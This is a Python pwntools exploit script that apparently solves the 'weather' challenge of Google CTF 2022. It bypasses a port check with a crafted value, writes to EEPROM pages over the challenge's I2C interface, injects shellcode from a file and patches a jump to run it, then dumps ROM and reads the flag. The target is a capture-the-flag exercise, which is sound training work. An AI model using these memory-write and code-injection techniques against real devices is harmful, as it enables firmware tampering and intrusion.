import pwn
import sys

PORT = 33
PAGE = 64


def printe(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)


def fake_port(port):
    r = 108000 + port + 256
    r += port - (r % 256)

    return r


def write_mem(pipe: pwn.remote, addr, data):
    while len(data) > 0:
        page = addr // PAGE
        offset = addr % PAGE
        page_data = bytes([page])
        page_data += b"\xA5\x5A\xA5\x5A"
        page_data += b"\x00" * offset
        page_data += bytes(b ^ 255 for b in data[: PAGE - offset])
        addr += PAGE - offset
        data = data[PAGE - offset :]

        message = b"w %d %d %s" % (
            fake_port(PORT),
            len(page_data),
            b" ".join(str(int(c)).encode("ascii") for c in page_data),
        )
        pipe.sendline(message)
        pipe.recvuntil(b"? ", drop=True)


def dump_rom(pipe):
    rom = bytearray()
    for page in range(64):
        printe("Dumping page %d" % page)
        pipe.recvuntil(b"? ")
        pipe.sendline(b"w %d 1 %d" % (fake_port(PORT), page))
        pipe.recvuntil(b"? ", drop=True)
        pipe.sendline(b"r %d 64" % fake_port(PORT))
        pipe.recvuntil(b"i2c status: ")
        status = pipe.recvline(keepends=False).decode()
        data = [int(c) for c in pipe.recvuntil(b"\n-end", drop=True).decode().split()]
        if "error" in status:
            printe("Error: %s" % status)
            break
        rom += bytes(data)

    with open("data.bin", "wb") as f:
        f.write(rom)


def patch_jump(pipe):
    write_mem(pipe, 0x04F3, b"\x00\x00\x02\x0e\x00")


def inject_code(pipe):
    write_mem(pipe, 0x0E00, open("hack.bin", "rb").read())


def read_flag(pipe):
    pipe.recvuntil(b"CTF", drop=True)
    flag = pipe.recvuntil(b"}")
    print((b"CTF" + flag).decode())


if __name__ == "__main__":
    pipe = pwn.remote("weather.2022.ctfcompetition.com", 1337)
    inject_code(pipe)
    patch_jump(pipe)
    read_flag(pipe)
    pipe.close()
